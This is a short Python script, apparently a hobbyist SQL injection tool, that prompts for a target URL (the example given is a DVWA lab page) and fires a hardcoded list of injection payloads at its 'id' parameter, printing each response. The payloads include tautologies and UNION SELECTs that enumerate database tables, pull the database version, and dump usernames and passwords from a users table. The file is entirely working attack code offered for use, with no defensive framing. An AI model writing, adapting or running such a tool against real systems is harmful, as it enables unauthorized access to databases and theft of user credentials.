import requests
from colorama import Fore, Style

class V1Rtu3h05tInjection:
    def __init__(self):
        self.url = input("Target URL (e.g. http://localhost/dvwa/vulnerabilities/sqli/): ").strip()
        self.payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--",
            "' UNION ALL SELECT NULL, username, password FROM users--",
            "' UNION SELECT NULL, NULL, CONCAT('Version: ', @@version)--",
            "' AND (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0--",
            "' OR EXISTS (SELECT * FROM users WHERE username = 'admin')--"
        ]

    def banner(self):
        print(f"{Fore.RED}{Style.BRIGHT}=== V1Rtu3-h05t Injection ==={Style.RESET_ALL}")

    def scan(self):
        self.banner()
        for payload in self.payloads:
            params = {'id': payload, 'Submit': 'Submit'}
            try:
                response = requests.get(self.url, params=params)
                if response.status_code == 200 and response.text.strip():
                    print(f"{Fore.GREEN}Success: Payload: {payload}\n{response.text[:500]}\n{'-'*40}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}Blocked or empty: Payload: {payload} | Status: {response.status_code}{Style.RESET_ALL}")
            except requests.RequestException as e:
                print(f"{Fore.RED}Request failed: {e}{Style.RESET_ALL}")

    def menu(self):
        self.banner()
        print(f"{Fore.BLUE}1. Run scan\n2. Exit{Style.RESET_ALL}")
        choice = input("Choice: ")
        if choice == '1':
            self.scan()
        elif choice == '2':
            print("Exiting.")
        else:
            print("Invalid choice.")
            self.menu()
